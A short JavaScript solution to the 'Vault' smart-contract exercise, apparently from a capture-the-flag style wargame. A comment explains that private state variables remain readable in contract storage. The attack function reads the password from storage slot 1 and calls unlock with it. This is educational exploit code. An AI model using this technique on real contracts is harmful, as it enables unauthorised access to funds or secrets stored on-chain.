/**

Vault
 
Vulnerability:
Accessibility of Private State Variables

Preventative Techniques:
Do not store sensitive data on-chain
Private access modifier is used for restricting direct access
But the data is publicly avaliable on the storage of the contract

*/

const attack = async () => {

    const password = await web3.eth.getStorageAt(contract.address, 1);

    await contract.unlock(password);
}
